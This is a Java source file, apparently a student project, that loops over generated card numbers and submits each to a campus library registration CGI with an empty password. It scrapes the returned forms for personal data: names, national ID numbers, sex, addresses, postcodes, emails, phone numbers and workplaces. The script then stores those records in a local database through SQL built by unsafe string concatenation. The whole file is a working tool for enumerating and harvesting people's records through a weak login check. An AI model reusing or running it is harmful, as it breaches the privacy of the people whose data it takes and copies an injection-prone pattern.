package qgb.project.ccsu;

import qgb.T;
import qgb.net.HttpRequest;
import qgb.project.JDBC_Test;
import qgb.text.Regex;
import qgb.text.Text;

public class Lib {
	static String sql;

	public static void main(String[] args) throws Exception {
		// T.print(T.time());
		JDBC_Test.getConnection();

		for (int i =1; i < 50; i++) {
			for (int j =1; j < 55; j++) {
				for (int j2 = 0; j2 <14; j2++) {
					for (int k = 1; k < 14; k++) {
						get_info(Integer.valueOf("20"
								+Text.format(j2,"00")+ Text.format(k, "00")
								+ Text.format(j+24, "00")+Text.format(i, "00")));
					} 

				}


 			}
		}
		// JDBC_Test.query();
		// HttpRequest hr=new HttpRequest();
		// String str= hr.sendPost(
		// "http://172.16.32.11/cgi-bin/confirmuser",
		// "v_newuser=1&v_regname=&v_cardno=11077" + 2009041103 + "&v_passwd=");
		//
		// T.print(str);

		// T.print("(?<=<input type=hidden name=v_office size=\"20\" value=).{1,50}(?= >)");
		// get_info(2009041103);
		// for (int j = 1; j < 13; j++) {
		// for (int i = 0; i < 5; i++) {
		// get_info(Integer.valueOf("2009"+Text.format(j,"00")+(1101+i)));
		// }
		//
		// }

	}

	public static void get_info(int ai) {

		String str = HttpRequest.post(
				"http://172.16.32.11/cgi-bin/confirmuser",
				"v_newuser=1&v_regname=&v_cardno=11077" + ai + "&v_passwd=");
		// T.write(ai+".html", str);
		String st_num = "", st_name = "", st_id = "", st_sex = "", st_addr = "", st_zip = "", st_emai = "", st_tele = "", st_offi = "", st_good;
		// System.out.println(sr);
		// T.write("2005.html", sr);
		st_num = Regex
				.get_first_text(
						"(?<=<input type=hidden name=v_cardno value=11077)\\d{10}",
						str);
		st_name = Regex
				.get_first_text(
						"(?<=<input type=hidden name=v_name size=\"20\" value=).{1,20}(?= >)",
						str);
		if (st_name == "" || Integer.valueOf(st_num) != ai) {
			T.print(ai + " empty!" + st_num);
			return;
		}
		st_id = Regex
				.get_first_text(
						"(?<=<input type=\"text\" name=\"v_id\"  size=\"20\" value=\").{10,20}(?=\" ></td>)",
						str);
		st_sex = Regex
				.get_first_text(
						"(?<=<select size=\"1\" name=\"v_sex\">).{61}(?=</select></td>)",
						str);
		st_sex = Regex
				.get_first_text("(?<=selected>).{1}(?=</option>)", st_sex);
		st_addr = Regex
				.get_first_text(
						"(?<=<input type=\"text\" name=\"v_address\" size=\"20\" value=\").{1,50}(?=\" ></td>)",
						str);
		st_zip = Regex
				.get_first_text(
						"(?<=<input type=\"text\" name=\"v_zip\" size=\"20\" value=\").{1,10}(?=\" ></td>)",
						str);
		st_emai = Regex
				.get_first_text(
						"(?<=<input type=\"text\" name=\"v_email\" size=\"20\" value=\").{1,50}(?=\" ></td>)",
						str);
		st_tele = Regex
				.get_first_text(
						"(?<=<input type=\"text\" name=\"v_telephone\" size=\"20\" value=\").{1,50}(?=\"></td>)",
						str);
		st_offi = Regex
				.get_first_text(
						"(?<=<input type=hidden name=v_office size=\"20\" value=).{1,50}(?=/td>)",
						str);
		st_offi = st_offi.substring(0, st_offi.indexOf(">"));

		st_offi = st_offi.trim();
		st_good = Regex
				.get_first_text(
						"(?<=<input type=\"text\" name=\"v_goodat\" size=\"20\" value=\").{1,50}(?=\" ></td>)",
						str);

		// st_name=Regex.get_first_text(, str);
		// T.print("(?<=<input type=\"text\" name=\"v_id\"  size=\"20\" value=\").*(?=\" >)");
		// T.print(st_num);
		// T.print(st_name);
		// T.print(st_id);
		// T.print(st_sex);
		// T.print(st_addr);
		// T.print(st_zip);
		// T.print(st_emai);
		// T.print(st_tele);
		// T.print(st_offi);
		// T.print(st_good);

		sql = "INSERT INTO lib (inum,st_name,st_id,st_sex,st_addr,st_zip,st_emai,st_tele,st_offi,st_good) "
				+ "VALUES ("
				+ st_num
				+ ",'"
				+ st_name
				+ "','"
				+ st_id
				+ "','"
				+ st_sex
				+ "','"
				+ st_addr
				+ "','"
				+ st_zip
				+ "','"
				+ st_emai
				+ "','" + st_tele + "','" + st_offi + "','" + st_good + "');";
		T.print(sql);
		// JDBC_Test.getConnection();
		JDBC_Test.SQL_execute(sql);
	}

}
